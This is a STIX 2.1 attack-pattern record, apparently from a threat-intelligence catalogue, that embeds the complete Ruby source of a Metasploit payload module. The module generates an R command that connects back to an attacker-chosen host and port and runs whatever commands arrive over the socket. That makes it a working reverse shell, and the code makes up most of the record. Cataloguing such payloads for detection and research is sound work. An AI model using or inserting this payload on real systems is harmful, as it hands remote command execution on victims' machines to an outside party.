{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0d28a7ee-578c-4f90-bd0e-f5411f7f923e",
    "created": "2024-08-14T16:33:19.332407Z",
    "modified": "2024-08-14T16:33:19.33241Z",
    "name": "Unix Command Shell, Reverse TCP (via R)",
    "description": "Connect back and create a command shell via R",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/reverse_r.rb",
            "external_id": "reverse_r.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 157\n\n  include Msf::Payload::Single\n  include Msf::Payload::R\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n     'Name'        => 'Unix Command Shell, Reverse TCP (via R)',\n     'Description' => 'Connect back and create a command shell via R',\n     'Author'      => [ 'RageLtMan <rageltman[at]sempervictus>' ],\n     'License'     => MSF_LICENSE,\n     'Platform'    => 'unix',\n     'Arch'        => ARCH_CMD,\n     'Handler'     => Msf::Handler::ReverseTcp,\n     'Session'     => Msf::Sessions::CommandShell,\n     'PayloadType' => 'cmd',\n     'RequiredCmd' => 'R',\n     'Payload'     => { 'Offsets' => {}, 'Payload' => '' }\n    ))\n    register_advanced_options(\n      [\n        OptString.new('RPath', [true, 'The path to the R executable', 'R'])\n      ]\n    )\n  end\n\n  def generate(_opts = {})\n    return prepends(r_string)\n  end\n\n  def prepends(r_string)\n    return \"#{datastore['RPath']} -e \\\"#{r_string}\\\"\"\n  end\n\n  def r_string\n    lhost = datastore['LHOST']\n    lhost = \"[#{lhost}]\" if Rex::Socket.is_ipv6?(lhost)\n    return \"s<-socketConnection(host='#{lhost}',port=#{datastore['LPORT']},\" +\n      \"blocking=TRUE,server=FALSE,open='r+');while(TRUE){writeLines(readLines\" +\n      \"(pipe(readLines(s, 1))),s)}\"\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}